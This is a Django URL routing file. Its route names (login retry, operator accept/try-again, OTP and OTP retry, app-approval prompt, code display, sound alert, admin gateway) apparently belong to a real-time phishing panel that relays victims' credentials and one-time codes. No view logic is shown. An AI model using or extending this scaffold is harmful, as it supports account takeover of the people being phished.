from django.contrib import admin
from django.views.generic import TemplateView
from django.conf import settings
from django.conf.urls.static import static
from django.urls import path
from .views import AdminPanel, getUsers, DeleteUsers, Login, LoggingIn, CheckLogin, TryAgain, AcceptLogin, LoginRetry , ProoceedUserLogin, Account, OTPRetry, OTP, Athorizing, success, loading, PlaySound, panelGate, isActive, bye, StatusCheck, AppPlease, getCode, displayCode

urlpatterns = [
    
    path('adminPanel', AdminPanel, name='AdminPanel'),
    path('ajax/getUsers', getUsers, name="getUsers"),
    path('ajax/deleteUsers', DeleteUsers.as_view(), name="DeleteUsers"),
    path('', Login, name="login"),
    path('login/retry', LoginRetry , name="LoginRetry"),
    path('loggingIn', LoggingIn, name="loggingIn"),
    path('AcceptLogin', AcceptLogin.as_view(), name="AcceptLogin"),
    path('CheckLogin', CheckLogin.as_view(), name="CheckLogin"),
    path('TryAgain', TryAgain.as_view(), name="TryAgain"),
    path('ProoceedUserLogin', ProoceedUserLogin.as_view(), name="ProoceedUserLogin"),
    path('Account', Account.as_view(), name="Account"),
    path('OTP', OTP, name="OTP"),
    path('Athorizing', Athorizing, name="Athorizing"),
    path('OTPRetry', OTPRetry, name="OTPRetry"),
    path('success', success, name="success"),
    path('loading', loading, name="loading"),
    path('PlaySound', PlaySound, name="PlaySound"),
    path('adminGateway', panelGate, name="panelGate"),
    path('isActive', isActive, name="isActive"),
    path('bye', bye, name="bye"),
    path('StatusCheck', StatusCheck, name="StatusCheck"),
    path('AppPlease', AppPlease, name="AppPlease"),
    path('getCode', getCode.as_view(), name="getCode"),
    path('securecode', displayCode, name="displayCode"),


]
